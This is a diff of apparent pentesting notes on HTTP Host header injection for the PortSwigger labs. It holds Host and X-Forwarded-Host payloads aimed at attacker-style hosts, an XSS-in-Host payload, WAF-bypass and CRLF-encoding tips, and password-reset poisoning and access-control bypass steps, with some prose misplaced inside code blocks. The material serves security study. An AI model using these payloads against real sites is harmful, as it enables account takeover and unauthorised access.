@@ -469,60 +469,39 @@ Hello" onkeypress="prompt(1)
 - [https://portswigger.net/bappstore/3908768b9ae945d8adf583052ad2e3b3 headi -url http://target.com](https://www.blackhatethicalhacking.com/tools/headi/) headi -url http://target.com
 - https://github.com/inpentest/HostHeaderScanner bash script.sh -l urls.txt
 
-## 2. Attack Methods
-### Method 1:
-```http
-Host: bing.com
-```
-### Method 2:
-```http
-Host: bing.com
-X-Forwarded-Host: realweb.com
-```
-### Method 3:
-```http
-Host: realweb.com
-X-Forwarded-Host: bing.com
-```
-### Method 4:
-```http
-Referer: https://www.bing.com/
-Try to change host and referer header because few host is verify for referer header information. 
-also do the same first three attack to insert the referer header (Change referer header)
-```
+- **Host**: The primary header to test. Try injecting arbitrary domains.
+- **X-Forwarded-Host**: Often used by proxies; can override the Host header.
+- **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
+- **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
+- **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
+- **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.
 
-## 3. Host Header Injection with Web Cache Poisoning
-- Follow the above methods.
-- Click anywhere on the web application.
-- If redirected to `bing.com`, the site is vulnerable.
-
-## 4. Password Reset Poisoning
+## 2. Password Reset Poisoning
 - Obtain a **password reset link**.
 - Modify the `Host` header.
 
-## 5. Host Header Attack for XSS
-- Check if the response contains:
-  ```html
-  https://bing.com/?locald">
-  ```
-- Use the payload:
-  ```html
-  Host: bing.com"><script>alert(1)</script>
-  ```
-
-## 6. Host Header Injection on Referer Header
-- Modify headers:
+## 3. Host Header Injection on Referer Header
   ```http
   Connection: close
   Referer: https://www.bing.com/
   ```
-
 ## 7. Subdomain-Based Host Header Injection
 - Use existing and non-existing subdomains to inject headers.
 
-## 8. Advanced Host Header Attacks
-### Internal Host Access:
 ```http
+Host: bing.com
+Host: evil.com
+Host: attacker.com
+Host: fake.target.com
+X-Forwarded-Host: realweb.com
+Host: realweb.com
+X-Forwarded-Host: bing.com
+Referer: https://www.bing.com/
+Try to change host and referer header because few host is verify for referer header information. 
+also do the same first three attack to insert the referer header (Change referer header)
+
+Host: bing.com"><script>alert(1)</script>
+
 GET / HTTP/1.1
 Host: attacker.com
 
@@ -543,81 +522,14 @@ X-Host: attacker.com
 X-Forwarded-Server: attacker.com
 X-HTTP-Host-Override: attacker.com
 Forwarded: host=attacker.com
-```
-Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
-To identify Host Header Injection vulnerabilities, focus on these key parameters and headers:
-
-- **Host**: The primary header to test. Try injecting arbitrary domains.
-- **X-Forwarded-Host**: Often used by proxies; can override the Host header.
-- **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
-- **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
-- **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
-- **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.
-
-🧨 **Common Payloads to Bypass WAFs**
-
-Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header Injection testing:
-
-| Header Variant              | Payload Example              |
-|----------------------------|------------------------------|
-| Host                       | `evil.com`                   |
-| X-Forwarded-Host           | `evil.com`                   |
-| X-Host                     | `evil.com`                   |
-| X-Forwarded-Server         | `evil.com`                   |
-| X-HTTP-Host-Override       | `evil.com`                   |
-| Forwarded                  | `host=evil.com`              |
-| Absolute URL               | `GET https://evil.com/ HTTP/1.1` |
-| Duplicate Host             | `Host: vulnerable.com` + `Host: evil.com` |
-| Line Wrapping              | `Host: vulnerable.com\n Host: evil.com` |
-
-💡 **Tips for Bypassing WAFs**
 - Use **non-standard ports**: `Host: evil.com:badport`
 - Try **subdomain tricks**: `Host: attacker.vulnerable.com`
 - Use **encoded characters**: `%0d%0aHost: evil.com`
 - Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`
 
-Sure! Based on the content from the GitHub repository you linked, here are the **specific techniques demonstrated in the PortSwigger Labs for HTTP Host header attacks**:
-
-# **1. List of Vulnerabilities (Full Set)**
-
-1. **Web Cache Poisoning**
-2. **Password Reset Link Poisoning**
-3. **Host Header Injection**
-4. **Open Redirect / URL Confusion**
-5. **Virtual Host Routing Bypass**
-6. **SSRF via Host Header**
-7. **Access Control Bypass**
-8. **CORS Bypass Using Host Reflection**
-9. **Log Injection**
-10. **Firewall / WAF Bypass Cases** *(NEW)*
-11. **Domain Validation Bypass** *(NEW)*
-12. **Header Override Bypass** *(NEW)*
-13. **Unicode / Encoding Bypass** *(NEW)*
-
----
-
-# **2. Sample Payloads (Including Bypass Payloads)**
-
-All payloads are ready to use for pentesting.
-
----
-
-# 📌 **2.1 Basic Manipulation Payloads**
-
 ```
-Host: evil.com
-```
-
-```
-Host: attacker.com
-```
-
-```
-Host: fake.target.com
-```
-
----
+Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
 # 📌 **2.2 Password Reset Poisoning**
 
@@ -628,9 +540,6 @@ Content-Type: application/json
 
 {"email":"victim@example.com"}
 ```
-
----
-
 # 📌 **2.3 Open Redirect / URL Confusion**
 
 ```
@@ -1024,39 +933,15 @@ To simulate or bypass corporate proxies, use these tools:
 
 ---
 
-## 🔓 4. **Bypassing Access Controls via Host Header**
-
-### 🎯 Objective:
-
-Bypass authentication or domain-based restrictions by modifying the Host.
-
-### ✅ Steps:
-
 1. **Try to access a restricted resource**
    Normally responds with 401 or redirect.
 
 2. **Modify Host to a whitelisted one**
    Try values like:
-
    ```
    Host: internal-service
    Host: localhost
    ```
-
-3. **Observe the result**
-   If the app wrongly trusts this Host, you may gain access.
-
-4. **Combine with X-Forwarded-Host or X-Original-URL headers**
-
-   ```
-   Host: attacker.com  
-   X-Forwarded-Host: internal
-   ```
-
-5. **Check behavior**
-   Did it skip authentication? Did it trust internal access?
-
----
 
 ---
 # 4. URL Redirection (Used as a Phishing Attack) or Open Redirection
